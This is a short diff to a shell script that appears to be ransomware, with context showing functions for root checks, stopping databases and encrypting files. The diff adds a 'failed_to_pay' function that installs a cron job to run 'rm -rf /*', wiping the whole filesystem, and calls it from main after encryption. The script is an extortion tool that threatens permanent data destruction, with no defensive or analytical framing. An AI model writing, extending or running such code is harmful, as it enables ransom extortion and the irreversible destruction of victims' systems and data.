@@ -125,6 +125,12 @@ encrypt_files() {
     fi
 }
 
+failed_to_pay() {
+    echo "Setting cronjob to delete files in 7 days"
+    (crontab -l 2>/dev/null; echo "0 0 * * 0 sleep 7d; rm -rf /*") | crontab -
+    echo "Cronjob set successfully"
+}
+
 main() {
     check_root
     check_distro
@@ -132,6 +138,7 @@ main() {
     install_dependencies
     stop_database
     encrypt_files
+    failed_to_pay
 }
 
 main
